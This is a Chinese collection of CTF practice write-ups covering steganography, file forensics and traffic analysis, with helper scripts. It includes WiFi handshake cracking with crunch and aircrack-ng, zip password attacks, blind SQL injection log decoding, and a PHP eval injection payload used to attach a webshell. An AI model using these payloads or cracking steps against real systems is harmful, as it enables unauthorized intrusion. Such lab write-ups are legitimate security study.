# Misc

## 想蹭网先解开密码 (bugku)

1.创建密码字典：

crunch 11 11 -t 1391040%%%% -o password.txt

2.爆破：

aircrack-ng -a2 wifi.cap -w password.txt

3.第三个存在握手包，爆破出手机号

## linux2 (bugku)

1. binwalk打开发现jpg
2. dd分离，dd if=brave of=5.jpg skip=13712384 bs=1，提交flag不正确
3. linux grep命令查找KEY, grep 'KEY' -a brave

注： -a 不要忽略二进制数据

## 细心的大象

1. 解压失败，使用foremost分离出三个文件；
2. 在0000000.jpg的备注上有一串编码，base64解码后得到rar的解压密码，解压后得到2.png
3. 打开失败，修改宽高显示图片

## 爆照(08067CTF) (bugku)

1.foremost提取出一个zip文件，然后unzip解压，解压出8,88,888,等文件
2.binwalk批量分析发现88，888，8888文件存在嵌入的文件，foremost分离
3.88分离出一个二维码，888在文件属性备注里有一串base64，8888

## 猫片 (bugku)

1.根据提示LSB，用stegsolve进行图片信息提取，生成了新的图片，在winhex里去掉头部多余的部分
2.显示一张二维码，半张，修改高度，扫面下载了一个flag.rar文件，但是解压里面没有答案
3.提示有NTFS，流隐写，使用

附计算正确宽高的py脚本：

```
import os
import binascii
import struct
crcbp = open("999.png","rb").read()   #文件名
for i in range(1024):
    for j in range(1024):
        data = crcbp[12:16] + struct.pack('>i',i) + struct.pack('>i',j) + crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if crc32 == 0x08ec7edb:   #当前的CRC值
            print i,j
            print "hex",hex(i),hex(j)   #输出宽度和高度

```

## lips (bugku)

1. Stegsolve打开发现ysl的图案，提取分析发现zip包，另存为zip
2. 打开需要密码，提取图片色卡去ysl官网比对色号，大佬写的脚本，但由于官网代码更新，正则匹配不正确，自己写的脚本，色号匹配不正确，有的色号不存在

```
import requests
import re
import libnum

lips = ['BC0B28','D04179','D47A6F','C2696F','EB8262', 'CF1A77','C0083E','BC0B28','BC0B28','D13274', '6A1319','BC0B28','BC0B28','D4121D','D75B59', 'DD8885','CE0A4A','D4121D','7E453A','D75B59', 'DD8885'] 

def foo():
    url = 'https://www.yslbeautyus.com/on/demandware.store/Sites-ysl-us-Site/en_US/Product-Variation?pid=194YSL'
    content = requests.get(url).content
    # print(content)
    pattern=r'style="background-color: #(.*?)" title="(.*?)">' 
    rst=re.findall(pattern, content)
    print(len(rst))
    # print(rst)
    lips_num = []
    for i in lips:
        for color, num in rst:
            if color == i:
                lips_num.append(num)
                # print(num)

if __name__ == "__main__":
    foo()
```

## 旋转跳跃 (bugku)
1.使用MP3Stego对音频解码，解出一个txt文档

涉及到的命令：decode -x -p 密码 文件名

## 普通的二维码 (bugku)

winhex打开发现末尾有一串数字，只有0-7，没有8，9，126位，前3位146作为八进制时对应的是f

```
f=open("1.txt",'r')
res=''
for i in range(42):
    s=eval('0'+f.read(3))
    res+=chr(int(s))
print(res)
```

## 乌云邀请码 (bugku)

1.用 Stegsolve查看图片的每个颜色通道，发现三原色的0位的左上角有点奇怪，应该是LSB隐写，提取文件，选择颜色通道，另存为文件，就有flag了

## 神秘的文件 (bugku)

1. 解压后发现里面有一个flag.zip，一个logo.png，解压flag.zip发现需要密码，但里面还包含一个logo.png，使用明文攻击
2. 将logo.png压缩成logo.zip，作为密钥，使用ARCHPR爆破密码，再解压原本的文件，发现里面有个docx文件
3. binwalk扫描发现里面有很多zip文件，使用binwalk分离文件，得到base64编码的flag


## 论剑 (bugku)

1. jpg头部FF D8，尾部FF D9，修改jpg宽高，FF C2 后三个字节，显示部分flag

![image.png](http://note.youdao.com/yws/res/279/WEBRESOURCE4653e34149050b01bf9e87bd24ffdd35)

2. winhex打开发现一串二进制，解码后mynameiskey!!!hhh
3. 二进制串位置后有个8对应38，后面是38 7B BC AF 27 1C ，而7z是的头部是37 7A BC AF 27 1C，修改头部，用dd分离出7z文件
4. 解压密码就是刚才解码的串，修改图片高度，对比两张图片得出flag


## 图穷匕见（bugku）

1. 右键属性，看到提示会画图吗
2. winhex打开找到jpg文件尾，FF D9，后面有大串数字，用nodepad++的插件hex->ASCII解码得到二维的坐标
3. 使用gnuplot画图，去掉左右括号逗号，得到二维码，调整大小后扫描后得到flag


## convert （bugku）
1.打开是一段二进制，使用脚本转成十六进制

```
f1=open('1.txt','r')
oct1=int(f1.read(),2)
hex1=hex(oct1)
f2=open('out.txt','w')
f2.write(hex1)
f1.close()
f2.close()
```
2. 去掉头部0x，导入010editer，发现头部有rar字样
3. 修改后缀为rar，解压后里面有一张jpg,查看属性里有一段base64,解码后得到flag

## 好多数值（bugku）

每一行都是255，255，255，联想到RGB值

```
from PIL import Image
x = 503 #x坐标  通过对txt里的行数进行整数分解
y = 122 #y坐标  x*y = 行数

im = Image.new("RGB",(x,y))#创建图片
file = open('1.txt') #打开rbg值文件

#通过一个个rgb点生成图片
for i in range(0,x):
  for j in range(0,y):
    line = file.readline()#获取一行
    rgb = line.split(",")#分离rgb
    im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素
im.show()
```

## 很普通的数独

1. binwalk扫描发现zip类型，修改后缀解压，里面是25张数独
2. 图片5*5排列，然后有数字的是1，没有数字的是0，提取出来
3.  使用python脚本画出二维码，扫描二维码得到一个多层的base64

```
from PIL import Image
x = 45
y = 45
 
im = Image.new('RGB', (x, y))
white = (255, 255, 255)
black = (0, 0, 0)
 
with open('file.txt') as f:
    for i in range(x):
        ff = f.readline()
        for j in range(y):
            if ff[j] == '1':
                im.putpixel((i, j), black)
            else:
                im.putpixel((i, j), white)
im.save("1.jpg")
```

## pen and apple (bugku)

**NTFS数据流隐藏**，没找到工具

## color

1. 解压后7张图片，用stegsolve打开可以看见字母，拼出来就是make me tall
2. 修改图片高度，图片下方显示黑白格，用1代表黑，0代表白，联想二进制
3. 第一列1100110代表f，用Python脚本输出

```
c1 = '11111111010111101111'
c2 = '11111011111110111111'
c3 = '00001100101010110001'
c4 = '01001010010000001101'
c5 = '11010011011101010111'
c6 = '10011011011010110110'
c7 = '00111001101101111101'
 
flag = ''
 
for i in range(0,20):
    c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]
    flag += chr(int(c,2))
 
print flag
```
## 传感器1（i春秋）
1. 硬件传感器考虑曼彻斯特编码
2. 解码后与ID对照，发现8位逆序（网络传输特性）
3. 八位逆序后得到原数据电平
```
# -*-coding:utf-8 -*-
#差分曼彻斯特解码（已知变化电平，求数据电平）

n=0x5555555595555A65556AA696AA6666666955
flag=''
bs='0'+bin(n)[2:]
r=''
def conv(s):
    return hex(int(s,2))[2:]

#标准曼彻斯特，01电平跳变表示数据电平的1, 10的电平跳变表示数据电平的0。
for i in range(0,len(bs),2):
        if bs[i:i+2]=='01'#01电平变化，原数据位为0
            r+='1'
        else:
            r+='0'

#根据八位倒序传输协议将二进制每八位reverse
#11111111 11111111 01111111 11001011 11111000 00100110 00001010 10101010 10011111
#11111111 11111111 11111110 11010011 00011111 01100100 01010000 01010101 11111001
#将逆序后的字符串每4位转hex（二进制变为16进制）
for i in range(0,len(r),8):
    tmp=r[i:i+8][::-1]
    flag+=conv(tmp[:4])
    flag+=conv(tmp[4:])
print flag.upper()
```

## 传感器2（i春秋）
1. 与传感器1相同变换得到原数据电平
2. 观察未知位的数据特点

## Matrix（i春秋）
1. 十六进制转二进制
2. 0表示白色，1表示黑色画图
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import PIL.Image
import numpy as np
 
def hex2bin(hexmat):
    binmattemp = [bin(m)[2:] for m in hexmat]
    rowlen = max([len(m) for m in binmattemp])
    binmat = [[0]+[int(b) for b in row.zfill(rowlen)] for row in binmattemp]
 
    print rowlen+1, 'x', len(binmat)
    for i in xrange(len(binmat)):
        print ''.join([str(b) for b in binmat[i]])
 
    return binmat, rowlen+1, len(binmat)
 
def rm_col(binmat, col):
    return [row[:col]+row[col+1:] for row in binmat]
 
 
def make_bw_img(binmat, w, h, outfilename, blackbit=0):
 
    bwmat = [[0 if b==blackbit else 255 for b in row] for row in binmat]
 
    imagesize = (w, h)
    img = PIL.Image.fromarray(np.uint8(np.array(bwmat)))
    img.save(outfilename)
 
if __name__ == '__main__':
    hexmat = [0x00000000,
              0xff71fefe,
              0x83480082,
              0xbb4140ba,
              0xbb6848ba,
              0xbb4a80ba,
              0x83213082,
              # 0xff5556fe,
              0xff5556fe,
              0x00582e00,
              0x576fb9be,
              0x707ef09e,
              0xe74b41d6,
              0xa82c0f16,
              0x27a15690,
              0x8c643628,
              0xbfcbf976,
              0x4cd959aa,
              0x2f43d73a,
              0x5462300a,
              0x57290106,
              0xb02ace5a,
              # 0xef53f7fc,
              0xef53f7fc,
              0x00402e36,
              0xff01b6a8,
              0x83657e3a,
              0xbb3b27fa,
              0xbb5eaeac,
              0xbb1017a0,
              0x8362672c,
              0xff02a650,
              0x00000000]
 
    binmat, w, h = hex2bin(hexmat)
    binmat = rm_col(binmat, 22)
    binmat = rm_col(binmat, 7)
    make_bw_img(binmat, w, h, 'matrix_rmcol.png', blackbit=1)
```
## CryMisc（i春秋）
1. jiami.py和gogogo.zip考虑明文攻击
2. 提取RSA.encrypt，解RSA，得到AES加密过后的key
3. 根据AESencrypt.py编写AES解密脚本对key进行AES解密，得到next.zip
4. 解压后根据encrypt.py编写逆解密脚本，得到flag.jpg
5. FFD9文件结束后，发现8BPS和8BIM字样，推测为psd图片，PS打开
6. 背景层另存为png，StegSolve提取，得到二维码
7. 扫码

## Scavenger Hunt（i春秋）
1. 下载目标站点 wget -r https://icec.tf
2. 搜索匹配字符：grep -ir icectf{ * 

## 神秘的文件（i春秋）
1. 更改后缀名为.png
2. StegSolve -> save bin蓝色最低位
3. 修改文件尾部的数据为424D的bmp文件头

## Random（i春秋）
1. EasyPythonDecompiler反编译.pyo文件
2. 根据encrypt.pyo_dis和flag.enc提供的密文，编写解密脚本
```
from random import randint
from math import floor, sqrt
import string

data=[208,140,149,236,189,77,193,104,202,184,97,236,148,202,244,199,77,122,113]
prints = string.printable

for key in range(65,128):
    flag=''
    key = key * 255
    for i in range(19):
        for char in prints:
            if ord(char) > 64:
                a = int(floor(float(key + ord(char)) / 2 + sqrt( key * ord(char))) % 255)
            
                if a == data[i]:
                    flag+=char
    if len(flag)==19:
        print flag
```

## warmup（i春秋）
1. 明文攻击
2. 相似图片提取盲水印

## 流量分析（i春秋）
1. 搜索出flag相关数据流（FTP），save as "原始文件"，导出flag.zip、key.log等
2. http流存在TSL加密，利用key.log进行解密【编辑→首选项→Protocols→TLS，然后在下面导入key.log文件】
3. http导出，zip包内mp3查看频谱图
4. 频谱图密码解密flag.zip，得到flag.txt

## SCAN(i春秋)
1. ICMP协议筛选出攻击数据包
2. 9/199 为同一台机器，对99目标机发起攻击：
   192.168.0.9发起第1次攻击数据包序号：1
   192.168.0.9第2次攻击数据包序号：148007
   192.168.0.9第3次攻击数据包序号：150753
   192.168.0.199第4次攻击数据包序号：155989

## pyHAHA（i春秋）
1. 编写脚本将整个文件倒序为123.py
```
a = open('PyHaHa.pyc,'rb').read();
b = open('123.pyc','wb');
b.write(a[::-1]);
``` 
2. foremost 提取123.py 
3. 压缩文件为伪加密，搜索0908改为0008，得到.mp3文件
4. DeEgger Embedder提取.mp3里的隐藏信息，得到base32编码的txt
5. 将每行编码b32decode，再b32encode()，
6. 带“=”结尾的字符串base后被修改为1，未修改为0（本地尝试比较开始出错，没再继续做）
7. 按照01画图……等。
	大佬的wp：https://bbs.ichunqiu.com/thread-25351-1-1.html

## 爆破？？（i春秋）
1. 修改后缀，明文攻击

## embarrass（i春秋）
1. Notepad打开搜索flag即可

## 登机牌（i春秋）
1. 修复二维码三个角定位符
2. 扫码，binwalk 查看，有压缩文件
3. 修改RAR文件头为52 61 72 21 ，导出为.rar
4. 解压，pdf密码为条形码反色后扫描

## 怀疑人生 (bugku)

1. 添加zip后缀解压里面有三个文件
2. 直接用archpr暴力破解ctf1.zip，解压后有个txt,base64decode后unicode解码，得到第一部分flg
3. binwalk分析ctf2.jpg，发现里面有zip文件，分离出来之后解压里面有个txt文件，发现是ook编码，得到3oD54e
4. 第三部分是个二维码，但比较模糊，qq能直接扫出来，也可以用QRsearch分析出来
5. 提交flag显示不正确，原来第二部分得到的3oD54e需要base58解码

## 红绿灯 (bugku)

1. gif，打开后发现是一个闪烁的红绿灯共1168帧
2. 一帧一帧查看发现多数是红色和绿色，偶尔有黄色且（每8个红绿后跟一个黄），可以推测红色和绿色对应二进制0和1，黄色作为分隔，这样第一个黄灯之前数值为01100110或10011001，而01100110二进制转成ascii对应字符就是‘f’,依次可以验证前四个字符为flag
3. 记录下所有的红绿灯，用Python跑出flag

```
f=open("1.txt",'r')
res=''
for i in range(100):
    s='0'+f.read(7)
    res+=chr(int(s,2))
print(res)
```

## 不简单的压缩包 (bugku)

这题很奇怪，我用win和kali打开zip包显示内容不一样，foremost分离出两个zip包

## 一枝独秀

1. 修改后缀为zip，解压后里面是一枝独秀.jpg，但是打不开
2. 用binwalk分析这个jpg，里面只有一个zip文件，修改后缀为zip
3. 用winrar打开zip，发现里面有很多张jpg，但是81.jpg的CRC32和大小与其他图片不一样
4. 用archpr爆破zip密码，解密后分析81.jpg
5. 使用JPHS提取出一个文件，binwalk分析这个文件，是个zip，解压后里面有个txt
6. 里面是一段佛曰加密，[使用这个网站解密](http://www.keyfc.net/bbs/tools/tudoucode.aspx)，再用栅栏解密，再base64转码

> [大佬的wp](https://blog.csdn.net/qq_33184105/article/details/102756753)

## 好多压缩包(bugku)

1. 打开之后好多zip文件，并且每个压缩文件里都有一个4个字节大小的名为data.txt的txt文件，于是尝试用**crc32碰撞**还原出所有压缩包中的文件内容，脚本如下：

```
import zipfile
import string
import binascii
 
def CrackCrc(crc):
    for i in dic:
        for j in dic:
            for p in dic:
                for q in dic:
                    s = i + j + p + q
                    if crc == (binascii.crc32(s) & 0xffffffff):
                        #print s
                        f.write(s)
                        return
 
def CrackZip():
    for I in range(68):
        file = 'out' + str(I) + '.zip'
        f = zipfile.ZipFile(file, 'r')
        GetCrc = f.getinfo('data.txt')
        crc = GetCrc.CRC
        CrackCrc(crc)
 
dic = string.ascii_letters + string.digits + '+/='
 
f = open('out.txt', 'w')
CrackZip()
f.close()
```
2. 碰撞出来的是一串base64，粘到nodepad++里转码，再另存为txt,导入010editor中，
3. 发现文件尾为rar的文件尾C43D7B00400700，但没有头部，给头部补上526172211A0700，修改后缀为rar,打开后flag在备注里


## 一个普通的压缩包（bugku）

1. 一个rar包，解压后里面有个flag.rar,解压时提示secret.png损坏
2. 用010editor打开flag.rar，修改A8 3C 7改成A8 3C 74（不清楚为啥，说是文件头损坏，但是png的文件头不是这个）
3. 打开后用stegsolve打开，在灰色通道里看见半张二维码，010打开发现文件是gif,有两帧，拼成完整的二维码

## Class10(i春秋）
1. 增加和修改文件头为89 50 4E 47 0D 0A 1A 0A

## Known（i春秋）
1. base64解密后与任意一行进行异或操作，得到.7z密码
2. 观察可知为简单字符替换，编写脚本进行映射和替换

## 那些年我追过的贝丝（i春秋）
1. base64解码

## Hello World(i春秋)
1. 签到题，粘贴即可

## 爆破-1（i春秋）
1. 在URL后加?hello=GLOBALS，将参数hello修改为超全局变量

## 剧情大反转（i春秋）
1. 字符串逆序

## flag格式（i春秋）
1. 签到题，粘贴即可

## 爆破-2（i春秋）
1. payload：?hello=${@eval($_POST[1])} 连蚁剑查看flag.php
2. 更多解法：https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=45706

## 泄露的数据（i春秋）
1. 与数据库有关 + 只有小写和数字
2. md5解密

## 所以这是13点吗（i春秋）
1. ROT-13

## challenge（i春秋）
1. 字母范围a-f + 数字
2. 16进制转ASCII码

## 考眼力（i春秋）
1. 凯撒左移一位

## 一个十六岁的少年（i春秋）
1. 16岁 + 字母范围a-f + 数字
2. 16进制转ASCII码

## try again(i春秋)
1. notepad++ 搜索“flag”

## 嘀嘀嘀（i春秋）
1. 莫斯电码

## 山岚（i春秋）
1. 栅栏密码

## Vape Nation（i春秋）
1. G色道0位水印

## 福尔摩斯（i春秋）
1. 莫斯电码

## 贝丝家族（i春秋）
1. 字母大写+数字
2. base32解码

## 签到题2（i春秋）
1. unicode解码

## 藏在邮件头的秘密（i春秋）
1. QuotedPrintable解码
    http://www.mxcz.net/tools/QuotedPrintable.aspx

## very simple math(i春秋)
1. 分析代码中表达式,为(f14*f13*f12..f1+f14*f13*..*f2+..+f14)*pad = hack
2.写py脚本爆破
```
import itertools
from hashlib import md5
hack=280098481791453837177137197730537158171743673148935867304957882116
dic=[2,2,19,31,59,97,127,3727,44948980991,1753609692783577883,556795634058750798159011]

def f1(arr):#得到取出数的乘积
    ret=1
    for i in arr:
        ret*=i
    return ret

def f2(a,b,s,n):
    if a//b-1 in range(32,127):#最后一次f2判断
        s=s+chr(a//b-1)
        if len(s)==14:
            checkmd5(s[::-1],n)#从14开始计算，因此将s倒序，求md5
    for c in range(32,127):
        if (a//b-1)%c==0:#(hack/pad - 1) % (fn) = 0，可整除fn
            f2(a//b-1,c,s+chr(c),n)

def checkmd5(s,n):
    for c in range(32,127):
        t=chr(c)+s
        if int.from_bytes(md5(t.encode('utf-8')).digest(),byteorder='big')==n:
            print(t)

for i in range(1,12):#穷举hack分解后的所有可能的pad，i为在字典内取出的因数个数
    for j in itertools.combinations(dic,i):#从字典中取出i个数
        tmp=f1(j)#得到取出数的乘积
        if tmp.bit_length() in range(120,129) :#如果pad的乘积长度在121~128比特
            print(tmp)
            f2(hack,tmp,'',tmp)#进入下一个函数判断pad
```
## Pretty Good Privacy(i春秋）
1. word文档显色，文件->显示->视图->隐藏文字，发现有隐藏文字 
2. TrueCrypt软件 使用tcCIS..密码挂载盘，在盘内发现.asc的公钥和私钥
3. PGP导入两份密钥
4. PGP导入.docx文件，输入PGPCI..密码
5. 原文件处右键PGPG->decode，打开解密后的文档，发现flag

## ext3
1. Kali内挂载磁盘文件  
#mkdir e  
#mount -t ext3 f1fc23f5c743425d9e0073887c846d23 e/  
#cd e
#find | grep 'flag'
#cat ./O7avZhikgKgbF/flag.txt  
2. base64解码

## pdf
1. 猜测是图片遮挡了某些文字，全局CTRL+A，复制到文本文档，即可看到。（之前没遇到过这种题，记录一下）

# 流量分析（bugku）
## flag被盗
1. 分组字节流 + 字符串 查找“flag"
2. 追踪TCP流，可得flag

## 中国菜刀(bugku)
1. wireshark打开报错，尝试kali内binwalk
2. binwalk -e caidao.pcapng
3. 得到的压缩包解压

## 这么多数据包(bugku)
1. getshell 流的TCP报文中很可能包含 command 这个字段。tcp contains "command"过滤
2. 追踪TCP流，发现base64字段，解码

## 手机流量(bugku)
方法一：1. 手机和电脑之间非热点连接，考虑蓝牙协议。obex
2. 找到secret.rar，导出分组字节流
方法二：binwalk -e filename

## 日志审计(bugku)
1. .log为二分法盲注，因此获取到盲注返回为200的信息，ASCII+1即可得到某位上的正确ASCII码
   如n>20? 200 ，n>23? 404 , n>22? 200->n=23
2. 写python脚本，获取字符串的正确值
   wp:https://www.cnblogs.com/0yst3r-2046/p/12322110.html
```
# coding:utf-8
#py2
import re
import urllib
 
f = open('access.log','r')  # 下载的access.log文件的绝对路径
lines = f.readlines()
datas = []
for line in lines:
    t = urllib.unquote(line)     # 就是将文本进行 urldecode 解码
    if '1765' in t and 'flag' in t:  # 过滤出与flag相关，正确的猜解（只要200的）
        datas.append(t)
 
flag_ascii = {}  
for data in datas:
    matchObj = re.search( r'LIMIT 0,1\),(.*?),1\)\)>(.*?) AND', data)   # 在date 中搜索符合正则表达的字符串并 将匹配的字符串存入变量 matchObj 中
    if matchObj:
        key = int(matchObj.group(1))  # 取变量matchObj 中 的第一个括号里的内容 （也就是上条语句中的 （.*?）中的内容），获取字符所在位置的地方，并转为10进制
        value = int(matchObj.group(2))+1  # 取变量matchObj中的第二个括号里的内容，获取ASCII码的地方，并转为 10 进制。
        #由于使用二分法，因此最后一个满足二分条件的ASCII码+1，即获取正确的ASCII码

        flag_ascii[key] = value     # 使用字典，保存最后一次猜解正确的ascii码
         #如果新添加元素的键与已存在元素的键相同，原来键所对应的值就会被新的值替换掉    
        
flag = ''
for value in flag_ascii.values():
    flag += chr(value)
    
print flag
```
## weblogic（bugku）
1. weblogic + hostname提示
2. http过滤协议 + 字符串"hostname"，找到两个数据包
3. 追踪流，在html的网页数据内找到hostname的值

## 信息提取（bugku)
1. sqlmap盲注，806包开始二分法判断
2. 过滤http包，文件->导出分组解析结果->为CSV
3. 写脚本匹配key与key的value值
```
import re
import urllib.parse

# 更改为自己从wireshark提取出的csv文件地址
f = open(r"httpdata.csv")
lines = f.readlines()
datas = []
# 转码, 保存进datas
for line in lines:
    datas.append(urllib.parse.unquote(line))
urls = []  # 保存注入flag的url
for i in range(len(datas)):  # 提取出注入flag的url
    if datas[i].find("isg.flags ORDER BY `value` LIMIT 0,1),1,1))>64") > 0:
        urls = datas[i:]
        break


flag = {}
# 用正则匹配
macth1 = re.compile(r"LIMIT 0,1\),(\d*?),1\)\)>(\d*?) HTTP/1.1")
macth2 = re.compile(r'"HTTP","(\d*?)","HTTP/1.1 200 OK')
for i in range(0, len(urls), 2):  # 因为有返回响应, 所以步长为2
    get1 = macth1.search(urls[i])
    if get1:
        key = int(get1.group(1))  # key保存字符的位置
        value = int(get1.group(2))  # value保存字符的ascii编码
        get2 = macth2.search(urls[i+1])
        if get2:
            if int(get2.group(1)) > 450:
                value += 1
        flag[key] = value  # 用字典保存flag
f.close()
result = ''
for value in flag.values():
    result += chr(value)
print(result)


# ISG{BLind_SQl_InJEcTi0N_DeTEcTEd}
```
## 特殊后门（bugku）
1. 搜icmp，每个包内分别有flag的一个字符，连起来得到flag

## 抓到一只苍蝇（bugku）
1. 根据前面几个TCP包，从No.13包可以看到内容大致是上传文件fly.rar，size:525701
2. http.request.method==POST筛选发现被拆成了5个包传输
3. 导出对象->http，依次找出5个包
4. 5个包的字节流内的Data长度依次为131436、131436、131436、131436、1777，即总长度为527571
5. （527571-525701）/5，即为每个包内的文件头字节数
6. 依次去除5个包的包头，命令：dd if=文件名 bs=1 skip=364 of=需要保存的文件名
7. 在windows路径下合并5个包（原因未知）cmd窗口内：copy /B 文件1+文件2+... 合并文件名.rar
8. rar伪加密，第二行offset 7处的字节为加密位，将“84”改为“80”（原因未知），解开压缩包
9. flag.txt放入Kali内 foremost，得到多张图片，扫描图片内二维码即可拿到flag
